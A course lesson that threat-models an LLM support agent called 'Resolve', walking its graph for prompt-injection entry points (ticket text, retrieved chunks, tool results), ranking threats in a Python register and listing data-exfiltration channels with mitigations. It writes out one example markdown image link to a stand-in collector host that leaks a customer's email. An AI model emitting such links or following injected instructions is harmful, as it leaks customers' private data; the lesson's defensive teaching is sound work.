The Top 10 tells you what can go wrong in general. A **threat model** tells you what can go wrong here, in the system you actually built, and which of those things to fix first. It's the security flavor of the design review you ran in earlier projects, run with an adversary in the room. By the end of this lesson you'll have a ranked register for Resolve and an answer to the question that makes the whole exercise worth doing: if protected data leaves this system, which door does it leave through?

## Four questions worth answering

The system under the microscope is Resolve as you have built it. `input_guard` scrubs and scores the ticket. `classify` labels it. The router sends it to `knowledge_agent`, `billing_agent`, or `bug_agent`, or straight to `escalate`. The specialist's draft goes through `review`, then `output_guard`, then `route`, which ends at `resolve` or `escalate`. Two of those terminal nodes write back to the helpdesk. A first-pass threat model answers four questions about that graph. You don't need a formal STRIDE workshop to start, and STRIDE (spoofing, tampering, repudiation, information disclosure, denial of service, elevation of privilege) is worth knowing mostly because security reviewers speak it. What you need first is honesty about four things.

Assets. What's worth stealing or breaking? Customer PII in ticket text and in the account records `get_account` returns (plan, invoices, the last five charges), the knowledge base including its internal pages (the refund approval policy, the admin tools runbook), write access to the helpdesk through `create_issue`, `add_ticket_comment`, and `set_ticket_status`, the system prompts, and your token budget. That last one is a real asset even though it feels like an expense line.

Entry points. Where does untrusted data enter? The ticket is the obvious one: subject and body, typed by anyone with the web form or an email address. Retrieved chunks are the second, and they come from both public and internal docs. Tool results are the third and the one that gets forgotten: the issue bodies `search_issues` returns and the account record from `get_account`. Ticket comments would join the list through `get_ticket`, but no specialist in Resolve holds that tool, so they stay outside the boundary until someone scopes it in.

Trust boundaries. Where does untrusted data meet code you wrote or a model you prompted? Every crossing is a place where validation either happens or doesn't.

Attacker goals. What would somebody actually want out of Resolve? Free actions on the helpdesk, another customer's invoices, a leaked internal runbook or system prompt, or nothing more ambitious than running up your bill.

An assistant is genuinely good at the fourth question. Ask one to role-play an attacker against your graph and list ten ways in, and it will surface goals you'd have missed, because breadth is where humans fail at this. It cannot do the scoring that comes later. Likelihood depends on who can reach your ticket queue and impact depends on how sensitive your data really is, and neither fact is anywhere in the model's context. You draft, it critiques, you decide.

## Every input the agent reads is an input an attacker can write

Walk the graph node by node and write down what each one reads. The last column asks whether untrusted text arrives at this node for the first time.

<table header-row="true">
<tr>
<td>Node</td>
<td>Reads</td>
<td>Writes</td>
<td>Crosses a boundary</td>
</tr>
<tr>
<td>`input_guard`</td>
<td>ticket subject and body (untrusted)</td>
<td>`guard_input`</td>
<td>yes: the ticket</td>
</tr>
<tr>
<td>`classify`</td>
<td>the ticket, plus `guard_input`</td>
<td>`classification`</td>
<td>same ticket, first model that reads it</td>
</tr>
<tr>
<td>router</td>
<td>`classification`</td>
<td>an edge choice</td>
<td>no, but a wrong label sends the ticket to the wrong tool set</td>
</tr>
<tr>
<td>`knowledge_agent`</td>
<td>ticket, chunks from `search_kb` and `read_doc` (untrusted)</td>
<td>`draft`, `citations`, `confidence`</td>
<td>yes: retrieved chunks, public and internal</td>
</tr>
<tr>
<td>`billing_agent`</td>
<td>ticket, chunks, the record from `get_account` (untrusted)</td>
<td>`draft`, `citations`, `confidence`</td>
<td>yes: chunks and the account record</td>
</tr>
<tr>
<td>`bug_agent`</td>
<td>ticket, chunks, issue bodies from `search_issues` (untrusted)</td>
<td>`draft`, `citations`, `confidence`, a pending `create_issue`</td>
<td>yes: chunks and issue bodies</td>
</tr>
<tr>
<td>`review`</td>
<td>`draft`, `docs`</td>
<td>`review`</td>
<td>no new input, but it reads everything the specialist read</td>
</tr>
<tr>
<td>`output_guard`</td>
<td>`draft`, `citations`, `docs`</td>
<td>`guard_output`</td>
<td>no new input</td>
</tr>
<tr>
<td>`route`</td>
<td>`review`, `confidence`, `guard_output`, type</td>
<td>`decision`</td>
<td>no</td>
</tr>
<tr>
<td>`resolve`</td>
<td>`draft`, `decision`</td>
<td>a comment and a status through the helpdesk tools</td>
<td>yes, outbound: the reply leaves the system</td>
</tr>
<tr>
<td>`escalate`</td>
<td>`draft`, `escalation_reason`</td>
<td>an internal note and a status</td>
<td>yes, outbound: the note reaches a human's screen</td>
</tr>
</table>

Five nodes read something an outsider can influence. A customer writes the ticket. A malicious insider, or a scraped page that someone pasted into an article, writes the knowledge-base chunk. An attacker whose earlier bug report became an issue body writes the tool result the agent reads back. All of it arrives at the model as the same thing: context. All of it can carry sentences shaped like instructions.

Defending only the front door is the classic mistake here. `input_guard` on the ticket text feels like the whole job because the ticket is the only channel a human typed into. Your retrieval step (**Retrieval and RAG**) and your MCP tool results (**MCP: Tools for Agents**) are live entry points with exactly the same standing, and they arrive after `input_guard` has already passed the ticket.

*Diagram idea: the Resolve graph drawn left to right inside a dashed "trust boundary" box, with three red inbound arrows piercing the box at the input guard, the three specialists, and the tool results, and four labelled outbound arrows piercing it on the way out (rendered markdown, tool argument, ticket field, error trace). Asset chips for PII, KB, write access and budget sit inside the box.*

## Ranking the register

Assets and entry points give you a list. A list isn't a plan. Score each threat on likelihood and impact, multiply, and sort, because the product is what tells you what to build this week.

```python
# 1. the register: one row per threat, likelihood and impact on a 1 to 3 scale
THREATS = [
    # (threat, OWASP 2025 id, likelihood, impact, planned mitigation)
    ("Ticket body overrides instructions",          "LLM01",       3, 3, "input_guard risk score"),
    ("Planted doc chunk injects instructions",      "LLM01/LLM08", 2, 3, "chunks delimited as data"),
    ("Reply exfiltrates via markdown image or link", "LLM02/LLM05", 2, 3, "output_guard link allowlist"),
    ("billing_agent looks up another customer",     "LLM02/LLM06", 2, 3, "get_account email check in code"),
    ("resolve closes tickets it should not",        "LLM06",       2, 3, "interrupt() before set_ticket_status"),
    ("bug_agent files junk issues",                 "LLM06",       2, 2, "interrupt() before create_issue"),
    ("Internal page or system prompt disclosed",    "LLM07/LLM02", 2, 2, "review + output_guard, no secrets in prompts"),
    ("Runaway loop burns the token budget",         "LLM10",       1, 2, "step cap 6, token budget per run"),
]

# 2. rank by likelihood x impact, highest first
ranked = sorted(THREATS, key=lambda t: t[2] * t[3], reverse=True)

# 3. print the defensive order
for threat, owasp, likelihood, impact, mitigation in ranked:
    print(f"{likelihood * impact}  {owasp:<12} {threat:<46} -> {mitigation}")
```

```plain text
9  LLM01        Ticket body overrides instructions             -> input_guard risk score
6  LLM01/LLM08  Planted doc chunk injects instructions         -> chunks delimited as data
6  LLM02/LLM05  Reply exfiltrates via markdown image or link   -> output_guard link allowlist
6  LLM02/LLM06  billing_agent looks up another customer        -> get_account email check in code
6  LLM06        resolve closes tickets it should not           -> interrupt() before set_ticket_status
4  LLM06        bug_agent files junk issues                    -> interrupt() before create_issue
4  LLM07/LLM02  Internal page or system prompt disclosed       -> review + output_guard, no secrets in prompts
2  LLM10        Runaway loop burns the token budget            -> step cap 6, token budget per run
```

A few lines of Python for something you could sort by eye, and it still earns its place, because writing the register as data means the scores are visible and arguable. The 1 to 3 scale is deliberately coarse: a five-point scale invites you to agonize over whether something is a 3 or a 4 when the only decision the number has to support is what order you work in. Note what the ranking does to the top of the list. Injection through the ticket body scores 9 and gets defended first. Four threats tie at 6, which is the honest answer, and you break that tie on cost rather than pretending the scores differ.

Each row carries a planned mitigation, and most of them point forward to **Defenses & Red-Teaming**: the `input_guard` risk score for the top row, delimiting retrieved chunks so they read as data for the second, an `output_guard` that strips links for the third. Three rows are structural and cheap, which is why they get built even where they rank low. The `get_account` check is one `if` statement in the tool: the email argument must equal the ticket's own `customer_email`, or the tool refuses. The `interrupt()` before every write (**LangChain & LangGraph**) means a persuaded `bug_agent` produces a pending write a human sees rather than an issue. The step cap of 6 in each specialist loop and a token budget per run, checked against the `usage` field in state, bound the bill no matter what the model decides to do.

The token that Resolve's MCP server uses to reach the helpdesk deserves its own line. Give it read scope only, and let the two write paths go through the gated nodes with a separate token that `resolve` and `escalate` hold. A **scoped token** is a credential that can only do the subset of things its holder needs, and it turns "the model was persuaded to close a ticket" from an incident into a failed HTTP call.

## The channels data leaves through

Injection is the way in. **Exfiltration** is the payoff: moving data out of a system to somewhere the attacker can read it. It deserves its own pass over the same diagram, because an attacker who can steer Resolve nearly always wants the same thing, which is PII, another customer's invoices, an internal runbook, or your system prompt, delivered somewhere they can see it.

Moving data needs a **channel**, a path across the trust boundary. Agents open channels a chatbot never had, and the sneakiest one needs no tool call at all. Resolve's reply gets rendered as markdown in the helpdesk, and often again in the customer's email client. An injected instruction can make the draft carry this:

```plain text
![loading](https://collector.example/x.png?d=jane.doe%40example.com)
```

The victim's client fetches that URL to render the image. The customer sees a broken-image icon; the attacker sees a line in a web server log with the address sitting in the query string. Any auto-loaded resource works the same way, and no tool was involved, so nothing in your tool-permission model would have stopped it.

The other channels are more obvious once you're looking for them. One term first: an **egress allowlist** is a fixed list of hosts your system is permitted to send data to, enforced in code, so that a URL to any other host is dropped before it reaches a customer or a tool.

<table header-row="true">
<tr>
<td>Channel</td>
<td>How the data gets out</td>
<td>What closes it</td>
</tr>
<tr>
<td>Markdown image or auto-loaded link</td>
<td>The reply embeds a secret in a URL and the victim's client fetches it on render</td>
<td>`output_guard` strips images and links to hosts off the egress allowlist (**Defenses & Red-Teaming**)</td>
</tr>
<tr>
<td>Tool arguments</td>
<td>`add_ticket_comment` or `create_issue` is called with stolen data in its body</td>
<td>The `interrupt()` before every write, so a human reads the arguments first</td>
</tr>
<tr>
<td>Over-broad account lookup</td>
<td>`billing_agent` passes an email from the ticket body to `get_account` and the reply repeats what came back</td>
<td>The in-code check that the argument equals the ticket's `customer_email`, and nothing else</td>
</tr>
<tr>
<td>Internal pages in a customer reply</td>
<td>A specialist cites the refund approval policy or the admin runbook, which the index holds next to public articles</td>
<td>`review` rejects internal-only sources; `output_guard` blocks internal links and citation ids outside `docs`</td>
</tr>
<tr>
<td>Verbose errors and traces</td>
<td>A stack trace reaches the draft, or a full prompt with PII lands in a trace span</td>
<td>Sanitize errors, and keep secrets and raw PII out of traces (**LangSmith Observability**)</td>
</tr>
<tr>
<td>System prompt and its contents</td>
<td>The model repeats its own instructions when asked convincingly</td>
<td>Keep tokens and keys out of the prompt, so a leak costs you wording rather than credentials</td>
</tr>
</table>

Three of those six leak with no attacker present. An unchecked `get_account` will eventually surface the wrong customer's charges to a legitimate user who mentioned a colleague's address, an internal page will eventually match a customer's query better than the public one does, and a stack trace in a reply is a bug that ships itself. Worth remembering when someone argues that injection defenses are the only security work an agent needs.

## What the register commits you to

The diagram is what you show people. The register is what you work from, and it commits you to three things a diagram never does.

1. An order. Likelihood times impact turns eight equal-looking risks into a queue, and the queue is falsifiable: if you rated ticket injection a 9 and `input_guard` still only checks length, that gap is visible to anyone reading the table.
2. A named mitigation per row. A threat with no planned counter isn't a threat you've modelled, it's a threat you've noticed.
3. Both directions. Ways in and ways out get separate passes, because closing the outbound channels is what keeps a successful injection from becoming a breach.

Look at what the top of that register is made of. The 9 and the first of the threats tied at 6 are the same threat arriving through two different doors: injection through the ticket body, and injection through the chunks the specialists fetch for themselves. The next lesson, Prompt Injection Deep Dive, takes that threat apart, runs a small one against your own model, and explains why asking the model nicely to ignore it is not a defense.
